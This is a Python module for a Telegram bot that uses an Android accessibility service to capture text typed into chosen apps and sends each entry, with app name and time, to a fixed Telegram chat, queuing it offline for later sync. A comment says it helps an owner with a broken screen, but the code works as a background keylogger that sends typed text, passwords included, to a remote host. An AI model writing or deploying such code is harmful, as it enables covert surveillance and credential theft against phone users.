import logging
import threading
import time
import requests
from datetime import datetime
from bot.database.db_manager import db
from bot.utils.priority_queue import priority_queue
from bot.config import BOT_TOKEN, OWNER_ID

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────
# ACCESSIBILITY OBSERVER CLASS
# Observes text input from focused apps
# Purpose: Owner has damaged phone display —
# cannot see what they are typing.
# This sends what they type to Telegram
# so they can see it from there.
# Supports offline save + auto sync.
# ─────────────────────────────────────────
class AccessibilityObserver:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = OWNER_ID
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self._running = False
        self._thread = None
        self._last_input_id = None
        self.poll_interval = 1  # Check every 1 second for new input

    # ─────────────────────────────────────────
    # SEND TO TELEGRAM
    # ─────────────────────────────────────────
    def _send_to_telegram(self, message: str) -> bool:
        try:
            url = f"{self.base_url}/sendMessage"
            payload = {
                "chat_id": self.owner_id,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, json=payload, timeout=10)
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Accessibility observer send error: {e}")
            return False

    # ─────────────────────────────────────────
    # CHECK INTERNET CONNECTION
    # ─────────────────────────────────────────
    def _is_online(self) -> bool:
        try:
            requests.get("https://api.telegram.org", timeout=5)
            return True
        except Exception:
            return False

    # ─────────────────────────────────────────
    # CHECK IF APP IS IN FOCUSED LIST
    # ─────────────────────────────────────────
    def _is_app_observed(self, package_name: str) -> bool:
        try:
            return db.is_app_focused(package_name)
        except Exception as e:
            logger.error(f"Is app observed check error: {e}")
            return False

    # ─────────────────────────────────────────
    # ON TEXT INPUT OBSERVED
    # Entry point called when Accessibility Service
    # detects text change in a focused app
    # ─────────────────────────────────────────
    def on_input_observed(self, app_name: str, package_name: str, input_text: str) -> bool:
        try:
            if not input_text or not input_text.strip():
                return False

            # Only process apps in the observed list
            if not self._is_app_observed(package_name):
                logger.debug(f"App not in observer list: {package_name}")
                return False

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            input_text = input_text.strip()

            logger.info(f"Input observed in: {app_name}")

            if self._is_online():
                # Online — deliver immediately
                message = (
                    f"👁 Input Viewer\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"📲 App: <b>{app_name}</b>\n"
                    f"✏️ You typed:\n<code>{input_text}</code>\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"🕐 Time: {timestamp}\n"
                )
                success = self._send_to_telegram(message)
                if success:
                    # Save to DB as delivered
                    db.insert_viewer_log(app_name, input_text, timestamp)
                    logger.info(f"Input delivered for: {app_name}")
                    return True
                else:
                    # Send failed — save to queue
                    logger.warning(f"Input send failed — saving to queue: {app_name}")
                    priority_queue.add_viewer_log(app_name, input_text, timestamp)
                    return False
            else:
                # Offline — save to queue
                logger.info(f"Offline — input queued for: {app_name}")
                priority_queue.add_viewer_log(app_name, input_text, timestamp)
                return True

        except Exception as e:
            logger.error(f"On input observed error: {e}")
            return False

    # ─────────────────────────────────────────
    # SYNC OFFLINE VIEWER QUEUE
    # Called when internet is restored
    # ─────────────────────────────────────────
    def sync_offline_input(self) -> dict:
        try:
            if not self._is_online():
                return {"success": False, "reason": "offline", "synced": 0}

            queue = db.get_viewer_queue()
            synced = 0
            failed = 0

            for item in queue:
                try:
                    message = (
                        f"👁 Input Viewer [SYNCED]\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"📲 App: <b>{item['app_name']}</b>\n"
                        f"✏️ You typed:\n<code>{item['input_text']}</code>\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"🕐 Time: {item['timestamp']}\n"
                        f"🔄 Synced: {datetime.now().strftime('%H:%M:%S')}\n"
                    )
                    success = self._send_to_telegram(message)
                    if success:
                        db.remove_from_viewer_queue(item["id"])
                        synced += 1
                        logger.info(f"Offline input synced: {item['id']}")
                    else:
                        failed += 1
                except Exception as e:
                    logger.error(f"Sync input item error: {e}")
                    failed += 1

            return {"success": True, "synced": synced, "failed": failed}

        except Exception as e:
            logger.error(f"Sync offline input error: {e}")
            return {"success": False, "reason": str(e), "synced": 0}

    # ─────────────────────────────────────────
    # START OBSERVER LOOP
    # Polls DB for new undelivered input logs
    # ─────────────────────────────────────────
    def start(self):
        try:
            if self._running:
                logger.info("Accessibility observer already running")
                return
            self._running = True
            self._thread = threading.Thread(
                target=self._observer_loop,
                daemon=True,
                name="AccessibilityObserverThread"
            )
            self._thread.start()
            logger.info("Accessibility observer started")
        except Exception as e:
            logger.error(f"Start accessibility observer error: {e}")

    # ─────────────────────────────────────────
    # STOP OBSERVER
    # ─────────────────────────────────────────
    def stop(self):
        try:
            self._running = False
            logger.info("Accessibility observer stopped")
        except Exception as e:
            logger.error(f"Stop accessibility observer error: {e}")

    # ─────────────────────────────────────────
    # OBSERVER LOOP
    # Delivers any pending input logs to Telegram
    # ─────────────────────────────────────────
    def _observer_loop(self):
        while self._running:
            try:
                self._check_and_deliver_input()
            except Exception as e:
                logger.error(f"Observer loop error: {e}")
            time.sleep(self.poll_interval)

    # ─────────────────────────────────────────
    # CHECK AND DELIVER UNDELIVERED INPUT
    # ─────────────────────────────────────────
    def _check_and_deliver_input(self):
        try:
            with db.get_connection() as conn:
                rows = conn.execute(
                    """SELECT * FROM viewer_log 
                    WHERE is_delivered = 0 
                    ORDER BY created_at ASC 
                    LIMIT 10"""
                ).fetchall()

            if not rows:
                return

            if not self._is_online():
                logger.debug("Offline — input delivery waiting")
                return

            for row in rows:
                item = dict(row)
                try:
                    message = (
                        f"👁 Input Viewer\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"📲 App: <b>{item['app_name']}</b>\n"
                        f"✏️ You typed:\n<code>{item['input_text']}</code>\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"🕐 Time: {item['timestamp']}\n"
                    )
                    success = self._send_to_telegram(message)
                    if success:
                        with db.get_connection() as conn:
                            conn.execute(
                                "UPDATE viewer_log SET is_delivered = 1 WHERE id = ?",
                                (item["id"],)
                            )
                            conn.commit()
                        logger.info(f"Input delivered: {item['id']}")
                except Exception as e:
                    logger.error(f"Deliver input item error: {e}")

        except Exception as e:
            logger.error(f"Check and deliver input error: {e}")

    # ─────────────────────────────────────────
    # GET OBSERVER STATUS
    # ─────────────────────────────────────────
    def get_status(self) -> dict:
        try:
            focused_apps = db.get_focused_apps()
            with db.get_connection() as conn:
                total_logs = conn.execute(
                    "SELECT COUNT(*) as count FROM viewer_log"
                ).fetchone()["count"]
                undelivered = conn.execute(
                    "SELECT COUNT(*) as count FROM viewer_log WHERE is_delivered = 0"
                ).fetchone()["count"]
                queued = conn.execute(
                    "SELECT COUNT(*) as count FROM viewer_queue"
                ).fetchone()["count"]
            return {
                "running": self._running,
                "focused_apps": len(focused_apps),
                "app_names": [a["app_name"] for a in focused_apps],
                "total_logs": total_logs,
                "undelivered": undelivered,
                "queued": queued,
                "online": self._is_online()
            }
        except Exception as e:
            logger.error(f"Observer status error: {e}")
            return {"running": self._running, "focused_apps": 0, "total_logs": 0}


# ─────────────────────────────────────────
# SINGLETON INSTANCE
# ─────────────────────────────────────────
accessibility_observer = AccessibilityObserver()
